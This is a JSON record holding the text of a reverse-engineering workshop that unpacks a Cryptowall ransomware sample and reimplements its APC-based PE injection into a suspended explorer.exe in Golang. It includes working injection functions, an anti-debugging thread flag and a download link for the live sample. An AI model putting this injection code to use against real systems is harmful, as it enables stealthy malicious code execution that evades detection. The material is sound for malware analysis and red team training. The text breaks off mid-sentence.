{
    "id": "cdff86ce-73e8-48d8-b668-9d249e1ebf3c",
    "created_at": "2023-01-12T15:09:25.372573Z",
    "updated_at": "2025-03-27T02:06:03.10274Z",
    "deleted_at": null,
    "sha1_hash": "a7e14dd45b01b7149e4722988fac490b2b65c82e",
    "title": "2021-07-26 - Portable Executable Injection Study",
    "authors": "",
    "file_creation_date": "2022-05-29T00:59:10Z",
    "file_modification_date": "2022-05-29T00:59:10Z",
    "file_size": 3446893,
    "plain_text": "# Portable Executable Injection Study\n\n**malwareunicorn.org/workshops/peinjection.html**\n\n**Last Updated: 2021-07-26**\n\nThe intent of this workshop is to reverse engineer existing malware to extract the portable\nexecutable (PE) injection technique to be replicated for use for red team operation tooling.\nThe content of this workshop will begin by reverse engineering the malware Cryptowall and\nthen go over the injection technique. The injection sequence consists of writing code into a\nnewly created executable section in the target process, then using NtQueueApcThread to\nexecute the target code.\n\n## What you'll do\n\nReverse engineer the malware Cryptowall to replicate the PE injection technique.\n\n## What you'll learn\n\nRecognizing and bypassing a custom unpacking routine\nRecognizing control flow obfuscation\nRecognizing import table restoration\nView new executable memory sections in a newly created process\nWork with undocumented Windows API\nWalk through a portable executable injection routine\nHow Asynchronous Procedure Calls (APC) work\nWriting PE injection in Golang\n\n## What you'll need\n\nVirtual Machine with Windows 10\nAt least 4 GB of RAM\nAt least 20 GB of storage\nIda Pro/Free Disassembler\nX64dbg\n7Zip\nSysinternals Suite\nPE Bear\n\nIn summer of 2021, I needed to mentor a simple reverse engineering session. The topic\nfocused around looking at process injection but more specifically process hollowing\ntechniques. So I decided to go over the techniques used in various malware samples so that\n\n\n-----\n\nthe mentee could get a feel for replicating the techniques used by real malware. Cryptowall\nmalware seemed to fit the use case and is the content you see here.\n\nNote that this workshop is not geared to fully reverse engineer attributes of ransomware,\ninstead this workshop focuses on getting through the unpacking routine to get to the meat of\nthe process injection technique.\n\n## Cryptowall\n\n[During my search for malware samples, I came across a 2016 blog that talked about the PE](https://www.lastline.com/labsblog/a-peek-behind-the-cryptowall/)\ninjection technique used in this workshop. Instead of using the actual sample in the blog, I\ndecided to go on VirusTotal to look for something similar but more recent:\n\n[546817e28100127124a0368050cbe6ecd1ea7a64c0bdfbef14823bb77404c42b](https://www.virustotal.com/gui/file/546817e28100127124a0368050cbe6ecd1ea7a64c0bdfbef14823bb77404c42b/detection)\nFirst Submission 2020-01-18\nLast Submission 2020-01-31\nOriginal Name: SDFormatter.exe\nArch: x32\n\nHere are some diagrams I made to best describe a high level overview of the unpacking\nroutine and the PE injection routine:\n\n\n-----\n\n-----\n\n[If you haven't already, please take the RE101 workshop. The environment setup is the same.](https://malwareunicorn.org/workshops/re101.html)\n\n## Download the Unknown Malware\n\n[Download the binary for this Lab: Download Malware Zip](https://storage.googleapis.com/malwareunicorn-storage/virtual_machines/Cryptowall_6459414638526464.zip)\n\npassword: infected\n\n**WARNING - DO NOT UNZIP OR RUN THIS OUTSIDE OF A NETWORK ISOLATED VM**\n\n**Sha1 for 7z file**\n```\n17443fe656563f7734b18aca3989a5cf0a495817\n\n```\n**Sha256 Malware inside**\n```\n546817e28100127124a0368050cbe6ecd1ea7a64c0bdfbef14823bb77404c42b\n\n```\n1. Run the Victim VM and copy over the malware.zip into the VM.\n2. Unzip Warning - DO NOT UNZIP THIS OUTSIDE OF THE VM\n\nAs I would love to explain PE injection for you, one of my former interns has done wonderful\njob at explaining process injection along with 10 different types of techniques: Ten process\n[injection techniques: A technical survey of common and trending process injection](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)\n\n\n-----\n\ntechniques\n\n[Checkout MalwareTech's breakdown here: Portable Executable Injection For Beginners](https://www.malwaretech.com/2013/11/portable-executable-injection-for.html)\n\nSo I wanted to clarify some things about this workshop based on what is actually happening\nin this malware sample. There was some debate on what to technically label the technique\nbeing used here. Even though this cryptowall sample is not making a codecave or\nunmapping the original target process, it does force the injected code to execute in place of\nthe original explorer.exe code. So that technically puts it under process hollowing, but it\nseems more like generic code injection using APC threads.\n\n\nTechnique This\nworkshop\n\n\nPE\nInjection\n\n\nDLL\nInjection\n\n\nCode\nInjection\n\n\nProcess\nHollowing\n\n\nUses Code Cave No Sometimes Sometimes Sometimes Yes\n\nUnmapping Target No Sometimes No No Yes\n\nCreate New Section Yes Sometimes Sometimes Sometimes Sometimes\n\n\nRequires Image to be\nMapped\n\nUses Position\nIndependent Code\n(Shellcode)\n\n\nNo Yes Yes No Sometimes\n\nYes Not really Not really Yes Sometimes\n\n\nIAT Fix Needed Yes Yes Yes Yes Yes\n\n\nTarget Process Still\nExecutes Original Code\n\n\nNo Yes Yes Yes No\n\n\nWhen you initially open the binary in Ida Pro you will notice that there are only two functions\nthat are available. Obviously there are more functions than just these but your first guess\nshould be that this malware is either encrypted, packed, or the PE header is manipulated.\n\n\n-----\n\n### Identifying decrypting routines\n\nIf you look at the graph view in Ida, there is a loop that happens at the end of the graph.\nWithin this loop, there is a call to function code that doesn't exist within the data section.\n\nWhen you see a pattern like this, it is actually a data manipulation loop:\n\n\n-----\n\n1. A compare instruction followed by a branch instruction.\n2. A movement of data to a pointer of empty bytes or existing blob of data.\n3. A jump to complete the loop.\n4. Then finally an exit to the loop that ends with jumping to the newly written bytes.\n\nIn order to get to the actual code you will need to use a debugger to get through this\nunpacking loop. While it is possible to do it by hand, it's easier to use a debugger!\n\n### Let's start debugging!\n\nNow let's open up our debugger and set some breakpoints. Make sure to place your\nbreakpoint (F2) after the `JNZ call. Next make a breakpoint on the call to the unpacked`\ncode.\n\nNow run the program (F9) so that the instruction pointer stops at the call to the unpacked\ncode.\n\nIn the debugger, right click on the address of the call to the unpacked code. Select the option\nto dump the value of that address.\n\n\n-----\n\nBelow is the dump of that address. As you can see, the first value is `0xEB, which is a` `JMP`\ninstruction.\n\nNext, step into (F7) the call so that you land in the section of code that you dumped earlier.\nThroughout this binary, you will be using the same type of method to get to the unpacked\ncode.\n\n**Tip: It is always best to place a breakpoint at the start of the code in which you are jumping**\nto. Sometimes the debugger won't allow you to place a software breakpoint, instead place a\nhardware or memory execution breakpoint on the byte at that address. Also if you place a\nbreakpoint to an address that does not already exist, you will need to re-enable the\nbreakpoint again in the Breakpoints Tab once that address space exists again.\n\n\n-----\n\nThe next part of the code is obfuscated using control flow obfuscation. The code is basically\nbroken up into one or two lines of opcodes followed by a jump. Notice the mov esp, ebp\ninstruction which is typical for a function prologue.\n\n**[Note: This is typically an assembly instruction that appears in a function prologue. Function](https://en.wikipedia.org/wiki/Function_prologue)**\nprologues typically begin with a `push ebp, mov esp, ebp in Windows.`\n\n\n-----\n\n-----\n\nBecause Ida pro can t show this nicely in a graph view right away, you will need to do a\ncombination of these methods:\n\nTraverse the jumps in the debugger in order to figure out what is happening in this\nsection.\nand/or dump the code that was decrypted. You can do this by checking the compared\nup code to get the size then select the offset along with the size and dump to a binary\nfile. Next open in Ida and adjust the segments so that the image base reflects the\naddress you extracted it from.\nand/or use the debugger to display the control flow graph.\n\nKeep going until you find a `XOR opcode. Whenever you see the opcode` `XOR with a data`\npointer value and a single byte register value this means it is decrypting a section of code.\n\nThe next thing you will need to find is where the loop ends. A loop always consists of an\nincrement statement and a comparison statement, then a branch after the comparison. You\nwill need to look for this branch. Below are excerpts extracted from the obfuscated control\nflow.\n```\n0041122E | 39F1           | cmp ecx,esi       \n004112E0 | 72 78          | jb 546817.41135A\n004111C4 | 58            | pop eax                \n00411253 | FFE0           | jmp eax                \nSize is 0xC80\n\n```\nIn your debugger, set a breakpoint on the `JMP EAX so that you can step into the newly`\ndecrypted code. Run the program so it lands on your break point. Next you will need to dump\nthat memory address so that you can extract the binary data. You can either patch the\noriginal executable using a hex editor or bring the binary data into Ida so that you can\nanalyze it.\n\n**Tip: In x32dbg, you can search for instruction expressions by using the shortcut ctrl-f while in**\nthe CPU view. It helps to search (CTRL-F while in the CPU view) for `JMP EAX and place`\nbreakpoints on it to cut down on debugging. Be sure to always confirm with Ida that the\nbreakpoint you set is a valid instruction in the route you want to go.\n\n**Tip: It is always best to use Ida as your roadmap for stepping instructions in the debugger. If**\nyou know the starting address and size of this code you can dump it using your debugger,\nthen open the binary dump in Ida. Remember that this malware is running as a 32bit binary,\nso be sure to open it in Ida with that mode. Just use the default processor (Meta-PC).\n\n\n-----\n\nThe next section of code is an unpacker. It s easy to identify Packers by looking for the\n```\nLOOP opcode as well as the PUSHAD/POPAD opcode combination.\n\n```\n.\n\nSet a breakpoint on the instruction after the `JNE instruction at` `0x0041CBDF and continue`\nto run to that breakpoint so that you can skip the loop.\n\nThis next routine uses a trick to add strings onto the stack by using a `CALL instruction.`\nWhen a call is made, what comes after the call is placed on the stack because this is\nconsidered the return address.\n\n**Note: What is the difference between a** `JMP and a` `CALL instruction? They may have`\nsimilar opcodes but a `CALL instruction will push the current` `EIP also known as the return-`\ninstruction address onto the stack.\n\nThis is a sneaky way to place strings onto the stack typically used in shellcode. In this case,\nit is doing `CALL, POP EAX, ADD EAX,3 to shift the address to point to GetProcAddress.`\n\n**Tip: Where are these API like GetProcAddress being used? In this routine, calls to API are**\ngoing to be placed on the stack. While in the debugger, whenever you see an instruction\nsuch as `call dword ptr [ebp-24h], you can right-click on the address ebp-24h and`\nfollow in the disassembler view. This will take you to the api code and it will display the\nexport name of the API. To get back to where you were, you can right-click the EIP address\nand follow in the disassembler view. I suggest filling in these API calls as comments where\nthe call instructions are in Ida.\n\n\n-----\n\nThis rest of this code sets up the unpacking routine in a newly allocated memory section at\n0x30000. You will want to continue to step through to find the next instruction for `JMP EAX`\nand place a breakpoint. Once your `EIP is on 0x41CF7B where the` `JMP EAX is located,`\nstep into that address.\n\n**Note: Be sure to save the address in JMP EAX (EAX=0x303E4). This will serve as the**\nentrypoint to the next portion of code at memory section 0x30000 and you will need this for\nIda.\n\n**Tip: It is always best to use Ida as your roadmap for stepping instructions in the debugger. In**\nx32dbg, there is a Tab called Memory Map which contains all the mapped memory sections\nassociated with the process. Typically code that is planned to be executed will have the\nmemory mapped section's protection to be Read/Write/Execute or ERW---. You can rightclick on the memory 0x30000, and dump it to a binary file. Next you can open this binary file\nin Ida to follow along in the debugger.\n\n\n-----\n\n**Tip: So you opened the binary dump of memory section 0x30000 in Ida, now what?**\nWhenever you open binary data into Ida, Ida has no idea that this code started at 0x3000\nbecause there is no PE header info to tell it how to set it up. You will need to \"rebase\" the\nimage address of your binary data. To rebase your image, go to Edit->Segments->Rebase\n**_Program->Select Image Base and set it to 0x30000 (the start address of the memory_**\nsection). Now you will be able to follow along in the debugger.\n\n**Note: Now you rebased the image in Ida, so how come it's not disassembled like in the**\ndebugger? Ida Pro's disassembly is a flow-oriented disassembly vs. a linear disassembly like\nthe debugger. This means that Ida will follow calls, jmp, and return and disassemble as it\nfollows that flow.\n\nYou may have seen a pop-up that said \"IDA cannot identify the entry point automatically\n**_as there is no standard for binaries. Please move to what you think is an entry point_**\n**_and press \"C\" to start the autoanalysis.\" You should have saved the entrypoint from the_**\n```\nJMP EAX instruction as 0x303E4 . Go to that address by pressing the shortcut key \"g\".\n\n```\nYou may ask, what the heck is this garbage? Ida is trying to parse this section as double\ndwords (dd) but obviously you aren't able to view the bytes at your entrypoint address. You\nwill need to \"undefine\" this auto parsing. Select the dd you want to undefine and press the\nshortcut key \"u\". Now select the byte at the entrypoint address 0x303E4 and press the\nshortcut key \"c\" to convert these bytes into \"code\"/disassembly.\n\nNow it's your job as the reverse engineer to manually convert wrongly parsed bytes into\ndisassembly.\n\n## Self modification\n\nThis next routine of code prepares the meat of the Cryptowall code by placing the unpacked\ncode in the beginning of the text section and modifying the header of its own process\nmemory image. Be sure to save a copy of the original header because in the original blog\nthey mentioned that the section table was corrupted after the modification. Next, continue to\nstep through to search for the instruction `JMP EAX and step into.`\n\n**Tip: Breakpoint failed or address doesn't exist? Sometimes you have to wait for a memory**\nsection to exist before setting a breakpoint or you might have to re-enable a breakpoint. The\neasiest method is to just set a hardware execute breakpoint on the byte at that address\n\n\n-----\n\nOnce you've reached the unpacked code, it's best to dump out the text section starting from\n0x401000 of this executable from process memory. This way you can place this unpacked\ncode by overwriting the original executable using a hex editor so that you can follow along in\nIda Pro. Why not dump the whole thing, header and all? Because Cryptowall corrupts the\nsection header. It's best to just keep the original header and modify the entrypoint using\nPEBear.\n\n\n-----\n\nWith every unpacking routine there s always going to be a method to restore the import table.\nThe first function in the unpacked code is setting up the import table at 0x4016F0. To identify\nthis type of method you will see either a loop or a continuous calling of the same function to\nstore the addresses of functions into an array. Typically malware stores these functions\nrepresented by hashes or offsets and stores them in the .data section or in the instructions\nthemselves. Once you have access to the import table it will be easy to fill in the dynamic\ncalls to these functions in your disassembler.\n\n\n-----\n\nI would recommend that you start filling in the API calls in Ida so that you can follow along\nwith the debugger.\n\nBelow is the new memory allocation at 0x1D0000 for the import table.You can view this by\nright-clicking on the address and dumping to the Dump panel in x32dbg.\n\nNotable API calls from the Import Table (I did not include all of them here):\n\n\n-----\n\n**Offset (hex)** **API Call**\n\n0 ZwClose\n\n4 LdrLoadDll\n\n8 LdrGetProcedureAddress\n\nC NtAllocateVirtualMemory\n\n10 ZwFreeVirtualMemory\n\n14 NtProtectVirtualMemory\n\n18 ZwQueryVirtualMemory\n\n1C ZwWriteVirtualMemory\n\n20 ZwReadVitrualMemory\n\n24 ZwWow64ReadVirtualMemory64\n\n28 RtlFreeHeap\n\n2C memset\n\n30 memcopy\n\n38 memchr\n\n3C ZwCreateEvent\n\n40 ZwOpenEvent\n\n44 ZwSetEvent\n\n\n-----\n\n48 NtWaitForSingleObject\n\n4C ZwWaitForMultipleObjects\n\n50 NtQuerySystemInformation\n\n54 NtShutdownSystem\n\n58 RtlGetNtProductType\n\n5C ZwOpenProcess\n\n60 NtTerminateProcess\n\n64 ZwQueryInformationProcess\n\n68 NtDelayExecution\n\n6C RtlAdjustPrivilege\n\n70 RtlSetProcessIsCritical\n\n74 ZwOpenThread\n\n78 ZwTerminateThread\n\n7C NtResumeThread\n\n80 NtSuspendThread\n\n84 ZwQueryInformationThread\n\n88 ZwImpersonateThread\n\n8C RtlCreateUserThread\n\n\n-----\n\n90 ZwCreateThreadEx\n\n94 CsClientCallServer\n\n98 ZwWow64CsrClientCallServer\n\n9C NtGetContextThread\n\nA0 ZwSetContextThread\n\nA4 RtlExitUserThread\n\nA8 NtQueueApcThread\n\nAC NtSetInformationThread\n\nB0 ZwOpenProcessToken\n\nB4 NtQueryInformationToken\n\nB8 ZwCreateFile\n\nC0 ZwWriteFile\n\nC4 NtReadFile\n\nC8 ZwDeleteFile\n\nCC ZwQueryInformationFile\n\nD0 NtSetInformationFile\n\nD4 ZwQueryVolumeInformationFile\n\nD8 NtCreateSection\n\n\n-----\n\nDC ZwMapViewOfSection\n\nE0 ZwUnmapViewOfSection\n\nE4 RtlCreateSecurityDescriptor\n\nE8 RtlSetDaclSecurityDescriptor\n\nEC NtSetSecurityObject\n\nF0 ZwCreateKey\n\nF4 ZwOpenKey\n\nF8 ZwQueryKey\n\nFC ZwDeleteKey\n\n100 ZwQueryValueKey\n\n104 ZwSetValueKey\n\n108 NtDeleteValueKey\n\n10C ZwRenameKey\n\n134 wcscat\n\n170 RtlDosPathNameToNtPathName_U\n\n12C wcsncpy\n\n15C RtlInitUnicodeString\n\n1A0 NtQuerySystemTime\n\n\n-----\n\n1B4 CreateProcessInternal\n\n224 CreateRemoteThread\n\n228 GetCommandLineW\n\n22C AllocateAndInitializedSid\n\n230 CheckTokenMembership\n\n234 FreeSid\n\n238 LookupAccountSidW\n\n23C GetUserNameW\n\n294 GetKeyboardLayoutList\n\n298 GetSystemMetrics\n\n## Token Check\n\nIn this same function (0x4016F00) there is a call to attempt to check the token for elevated\nprivileges (0x409260).\n\n## Victim Fingerprinting\n\nAs this was mentioned in the diagram, I will be brief here. Next you will see a function\n(0x4041C0) related to creating a new event for \"BaseNamedObjects\" and then a function\ndoing the victim fingerprinting (0x404160). This event is created as a means for the malware\nto determine if it's a duplicate running process. Essentially it collects the victim information\nand hashes it to create the object name (i.e. \\\\BaseNamedObjects\\\\6224336787).\n\nCool, now that we go those out of the way, let's move on to actual injection part.s\n\n## Injecting Into Child Process explorer.exe (Function 0x40A680)\n\n\n-----\n\n### Querying the process\n\nThe beginning of this function, there is a query to the process information to determine\nwhether it is executing in the context of 32bit or 64bit architecture. This will determine\nwhether to use explorer from System32 or SysWOW64 respective folders. The windows API\nused here is ZwQueryInformationProcess.\n\n**Note: For the remaining portion of this workshop I will share the windows API call function**\nprototypes so that you can follow along with the function arguments. I will also provide the\nequivalent golang code.\n\n**Disassembly**\n\n**Function Prototype**\n\n\n-----\n\n```\nNTSTATUS WINAPI ZwQueryInformationProcess(\n _In_   HANDLE      ProcessHandle,\n _In_   PROCESSINFOCLASS ProcessInformationClass,\n _Out_   PVOID      ProcessInformation,\n _In_   ULONG      ProcessInformationLength,\n _Out_opt_ PULONG      ReturnLength\n);\n\n```\nRef: [https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess](https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess)\n\n**Golang**\n```\nfunc IsSysWow64(ntdll syscall.Handle) (bool, error) {\n    var pInfo uintptr\n    pInfoLen := uint32(unsafe.Sizeof(pInfo))\n    ZwQueryInformationProcess, err := syscall.GetProcAddress(\n        syscall.Handle(ntdll), \"ZwQueryInformationProcess\")\n    if err != nil {\n        return false, err\n    }\n    r, _, err := syscall.Syscall6(uintptr(ZwQueryInformationProcess),\n        5,\n        uintptr(windows.CurrentProcess()),    // ProcessHandle\n        uintptr(windows.ProcessWow64Information), // ProcessInformationClass\n        uintptr(unsafe.Pointer(&pInfo)),     // ProcessInformation\n        uintptr(pInfoLen),            // ProcessInformationLength\n        uintptr(unsafe.Pointer(&pInfoLen)),   // ReturnLength\n        0)\n    if r != 0 {\n        log.Printf(\"ZwQueryInformationProcess ERROR CODE: %x\", r)\n        return false, err\n    }\n    if pInfo != 0 {\n        return true, nil\n    }\n    return false, nil\n}\n\n### Creating New Process\n\n```\nNext it makes a call to CreateProcessInternalW which is an undocumented API call. This will\ncreate a new explorer.exe as a suspended child process.\n\n**Disassembly**\n\n\n-----\n\n**Function Prototype**\n```\nBOOL\n WINAPI\n CreateProcessInternalW(IN HANDLE hUserToken,\n            IN LPCWSTR lpApplicationName,\n            IN LPWSTR lpCommandLine,\n            IN LPSECURITY_ATTRIBUTES lpProcessAttributes,\n            IN LPSECURITY_ATTRIBUTES lpThreadAttributes,\n            IN BOOL bInheritHandles,\n            IN DWORD dwCreationFlags,\n            IN LPVOID lpEnvironment,\n            IN LPCWSTR lpCurrentDirectory,\n            IN LPSTARTUPINFOW lpStartupInfo,\n            IN LPPROCESS_INFORMATION lpProcessInformation,\n            OUT PHANDLE hNewToken)\n\n```\n**Golang**\n\n\n-----\n\n```\nfunc CreateProcessInt(kernel32 syscall.Handle, procPath string) (uintptr, uintptr,\nerror) {\n    CreateProcessInternalW, err := syscall.GetProcAddress(\n        syscall.Handle(kernel32), \"CreateProcessInternalW\")\n    if err != nil {\n        log.Fatalln(err)\n        return 0, 0, err\n    }\n    var si windows.StartupInfo\n    var pi windows.ProcessInformation\n    log.Println(procPath)\n    r, a, err := syscall.Syscall12(uintptr(CreateProcessInternalW),\n        12,\n        0, // IN HANDLE hUserToken,\n        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(procPath))), // IN\nLPCWSTR lpApplicationName,\n        0,                 // IN LPWSTR lpCommandLine,\n        0,                 // IN LPSECURITY_ATTRIBUTES\nlpProcessAttributes,\n        0,                 // IN LPSECURITY_ATTRIBUTES\nlpThreadAttributes,\n        0,                 // IN BOOL bInheritHandles,\n        uintptr(windows.CREATE_SUSPENDED), // IN DWORD dwCreationFlags,\n        0,                 // IN LPVOID lpEnvironment,\n        0,                 // IN LPCWSTR lpCurrentDirectory,\n        uintptr(unsafe.Pointer(&si)),   // IN LPSTARTUPINFOW\nlpStartupInfo,\n        uintptr(unsafe.Pointer(&pi)),   // IN LPPROCESS_INFORMATION\nlpProcessInformation,\n        0)                 // OUT PHANDLE hNewToken)\n    if r > 1 { // hack for error code invalid function\n        log.Printf(\"CreateProcessInternalW ERROR CODE: %x\", r)\n        return 0, 0, err\n    }\n    log.Printf(\"%x %x %s %x\", r, a, err, pi.Process)\n    return uintptr(pi.Process), uintptr(pi.Thread), nil\n}\n\n### Creating and Writing to New Section\n\n```\nInstead of unmapping the process image or hollowing out the process text section,\nCryptowall instead creates a new section in explorer.exe, then maps the section in both the\nlocal and remote process.\n\n**Disassembly**\n\n\n-----\n\n**Function Prototype**\n```\nNTSTATUS NtCreateSection(\n PHANDLE      SectionHandle,\n ACCESS_MASK    DesiredAccess,\n POBJECT_ATTRIBUTES ObjectAttributes,\n PLARGE_INTEGER   MaximumSize,\n ULONG       SectionPageProtection,\n ULONG       AllocationAttributes,\n HANDLE       FileHandle\n);\n\n```\n**Golang**\n\n\n-----\n\n```\nfunc CreateNewSection(ntdll syscall.Handle, size int64) (uintptr, error) {\n    var err error\n    NtCreateSection, err := syscall.GetProcAddress(\n        syscall.Handle(ntdll), \"NtCreateSection\")\n    if err != nil {\n        return 0, err\n    }\n    var section uintptr\n    r, a, err := syscall.Syscall9(uintptr(NtCreateSection),\n        7,\n        uintptr(unsafe.Pointer(&section)), // PHANDLE      \nSectionHandle,\n        FILE_MAP_ALL_ACCESS,        // ACCESS_MASK    \nDesiredAccess,\n        0,                 // POBJECT_ATTRIBUTES\nObjectAttributes,\n        uintptr(unsafe.Pointer(&size)),  // PLARGE_INTEGER   MaximumSize,\n        windows.PAGE_EXECUTE_READWRITE,  // ULONG       \nSectionPageProtection,\n        SEC_COMMIT,            // ULONG       \nAllocationAttributes,\n        0,                 // HANDLE       FileHandle\n        0,\n        0)\n    if r != 0 {\n        log.Printf(\"NtCreateSection ERROR CODE: %x\", r)\n        return 0, err\n    }\n    log.Printf(\"%x %x %s\", r, a, err)\n    if section == 0 {\n        return 0, fmt.Errorf(\"NtCreateSection failed for unknown reason\")\n    }\n    log.Printf(\"Section: %0x\\n\", section)\n    return section, nil\n}\n\n```\n[By mapping the section to both processes with ZwMapViewOfSection, you can easily write to](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection)\nthe using a simple memcpy without calling ZwWriteVirtualMemory and updating the\n[protection to allow execution. NtCreateSection already has execution protection flags](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection)\n(PAGE_EXECUTE_READWRITE) to set on creation while calling ZwMapViewOfSection\nuses PAGE_READWRITE . Note that the malware uses -1 (0xFFFFFFFF) as the process\nhandle, this indicates the current process. In the golang version, getting the current process\nhandle is a little cleaner.\n\n**Disassembly**\n\n\n-----\n\n**Function Prototype**\n\n\n-----\n\n```\nNTSYSAPI NTSTATUS ZwMapViewOfSection(\n HANDLE     SectionHandle,\n HANDLE     ProcessHandle,\n PVOID      *BaseAddress,\n ULONG_PTR    ZeroBits,\n SIZE_T     CommitSize,\n PLARGE_INTEGER SectionOffset,\n PSIZE_T     ViewSize,\n SECTION_INHERIT InheritDisposition,\n ULONG      AllocationType,\n ULONG      Win32Protect\n);\n\n```\n**Golang**\n```\nfunc MapViewOfSection(\n    ntdll syscall.Handle, section uintptr,\n    phandle uintptr, commitSize uint32,\n    viewSize uint32) (uintptr, uint32, error) {\n    if phandle == 0 {\n        return 0, 0, nil\n    }\n    var err error\n    ZwMapViewOfSection, err := syscall.GetProcAddress(\n        syscall.Handle(ntdll), \"ZwMapViewOfSection\")\n    if err != nil {\n        return 0, 0, err\n    }\n    var sectionBaseAddr uintptr\n    r, a, err := syscall.Syscall12(uintptr(ZwMapViewOfSection),\n        10,\n        section, // HANDLE     SectionHandle,\n        phandle, // HANDLE     ProcessHandle,\n        uintptr(unsafe.Pointer(&sectionBaseAddr)), // PVOID     \n*BaseAddress,\n        0,                 // ULONG_PTR    ZeroBits,\n        uintptr(commitSize),        // SIZE_T     CommitSize,\n        0,                 // PLARGE_INTEGER SectionOffset,\n        uintptr(unsafe.Pointer(&viewSize)), // PSIZE_T     ViewSize,\n        1,                 // SECTION_INHERIT\nInheritDisposition,\n        0,                 // ULONG     \nAllocationType,\n        windows.PAGE_READWRITE,       // ULONG      Win32Protect\n        0,\n        0)\n    if r != 0 {\n        log.Printf(\"ZwMapViewOfSection ERROR CODE: %x\", r)\n        return 0, 0, err\n    }\n    log.Printf(\"%x %x %s\", r, a, err)\n    return sectionBaseAddr, viewSize, nil\n}\n\n```\n\n-----\n\nIf this routine fails, Cryptowall defaults to the regular NtAllocateVirtualMemory,\nZwWriteVirtualMemory, NtProtectVirtualMemory routine to write to the target process'\nmemory.\n\n## How to view the new memory section\n\nAfter the section has been created and bytes have been written to that section base address,\nopen process explorer from the sysinternals suite and a new instance of your debugger.\n\n**Tip: Set a breakpoint after the call to memcpy (between the 2 ZwMapViewOfSection calls) or**\nafter the last call to ZwMapViewOfSection.\n\nIn process explorer, identify the child process of the Cryptowall process which would be\nexplorer.exe. In the new debugger instance attach to the explorer.exe process ID from what\nyou saw in process explorer.\n\nGo ahead and attach to explorer.exe. Notice that the binary is 32 bit.\n\nIn the Memory Map tab of the debugger, find the newly created section (this would be a base\naddress populated from ZwMapViewOfSection) in the memory list. This is typically at the end\nof the memory listing for explorer.exe. Another way to identify the memory section is that it's\n\n\n-----\n\nprotection is execute, read, write. While the RWX protection is the primary red flag, this\nsection is mapped as Type MAP and that even though it is executable, it was not allocated\ninitially as copy-on-write (ERWC), which means it is not backed by an image on disk.\n\nAs you can see below, Cryptowall decided to put the whole unpacked executable into\nmemory.\n\n\n-----\n\nSince this Cryptowall sample is also injecting position independent code I wanted to keep\nparity by showing a simple example. Now here is my golang code just injecting \"HELLO\nWORLD!\" into explorer.exe. Obviously you can trade out that byte buffer for some 32bit\nshellcode (I've done this in the linked example code).\n\n\n-----\n\nWhen function 0x40A680 was called, it passed an address to the ApcRoutine (0x413B40)\nthat NtQueueApcThread intends on executing. Looking at the std call panel, you can see that\nthe ApcRoutine is an address offset that exists in the new memory section.\n\n**Disassembly**\n\n**Function Prototype (Undocumented)**\n```\nNTSYSAPI \nNTSTATUS\nNTAPI\nNtQueueApcThread(\n IN HANDLE        ThreadHandle,\n IN PIO_APC_ROUTINE   ApcRoutine,\n IN PVOID        ApcRoutineContext OPTIONAL,\n IN PIO_STATUS_BLOCK   ApcStatusBlock OPTIONAL,\n IN ULONG        ApcReserved OPTIONAL );\n\n```\n**Golang**\n\n\n-----\n\n```\nfunc QueueApcThread(ntdll syscall.Handle, thandle uintptr, funcaddr uintptr) error {\n    var err error\n    NtQueueApcThread, err := syscall.GetProcAddress(\n        syscall.Handle(ntdll), \"NtQueueApcThread\")\n    if err != nil {\n        return err\n    }\n    r, _, err := syscall.Syscall6(uintptr(NtQueueApcThread),\n        5,\n        thandle, // IN HANDLE        ThreadHandle,\n        funcaddr, // IN PIO_APC_ROUTINE   ApcRoutine,\n(RemoteSectionBaseAddr)\n        0,    // IN PVOID        ApcRoutineContext OPTIONAL,\n        0,    // IN PIO_STATUS_BLOCK   ApcStatusBlock OPTIONAL,\n        0,    // IN ULONG        ApcReserved OPTIONAL\n        0)\n    if r != 0 {\n        log.Printf(\"NtQueueApcThread ERROR CODE: %x\", r)\n        return err\n    }\n    return nil\n}\n\n```\nThen finally setting the ThreadInformationClass and resuming the main thread of the target\nprocess. Now I'm not sure what the intent of using ThreadTimes (0x1) was here. I really think\nthis may have been a typo on the malware author's part. Just adding one more 1 will change\nthe ThreadInformationClass to ThreadHideFromDebugger (0x11) which is probably what\nthey wanted otherwise it will keep throwing an error STATUS_INVALID_INFO_CLASS\n(0xC0000003).\n\n**Disassembly**\n\n**NtSetInformationThread**\n\n\n-----\n\n```\n__kernel_entry NTSYSCALLAPI NTSTATUS NtSetInformationThread(\n HANDLE     ThreadHandle,\n THREADINFOCLASS ThreadInformationClass,\n PVOID      ThreadInformation,\n ULONG      ThreadInformationLength\n);\n\n```\n**NtResumeThread**\n```\nNTSYSAPI \nNTSTATUS\nNTAPI\nNtResumeThread(\n IN HANDLE        ThreadHandle,\n OUT PULONG       SuspendCount OPTIONAL );\n\n```\n**Golang**\n\n\n-----\n\n```\nfunc SetInformationThread(ntdll syscall.Handle, thandle uintptr) error {\n    var err error\n    NtSetInformationThread, err := syscall.GetProcAddress(\n        syscall.Handle(ntdll), \"NtSetInformationThread\")\n    if err != nil {\n        return err\n    }\n    ti := int32(0x11) //ThreadHideFromDebugger\n    r, _, err := syscall.Syscall6(uintptr(NtSetInformationThread),\n        4,\n        thandle,   //     HANDLE     ThreadHandle,\n        uintptr(ti), //  THREADINFOCLASS ThreadInformationClass,\n        0,      //  PVOID      ThreadInformation,\n        0,      //  ULONG      ThreadInformationLength\n        0,\n        0)\n    if r != 0 {\n        log.Printf(\"NtSetInformationThread ERROR CODE: %x\", r)\n        return err\n    }\n    return nil\n}\nfunc ResumeThread(ntdll syscall.Handle, thandle uintptr) error {\n    NtResumeThread, err := syscall.GetProcAddress(\n        syscall.Handle(ntdll), \"NtResumeThread\")\n    if err != nil {\n        return err\n    }\n    r, _, err := syscall.Syscall(uintptr(NtResumeThread),\n        2,\n        thandle, //     IN HANDLE        ThreadHandle,\n        0,    //  OUT PULONG       SuspendCount OPTIONAL\n        0)\n    if r != 0 {\n        log.Printf(\"NtResumeThread ERROR CODE: %x\", r)\n        return err\n    }\n    return nil\n}\n\n```\nIf the NtQueueApcThread routine failed, then Cryptowall will default to the good ol'\nCreateRemoteThread call. I didn't plan to go over this section but feel free to look at it on\nyour own pace.\n\n**Disassembly**\n\n\n-----\n\n**Function 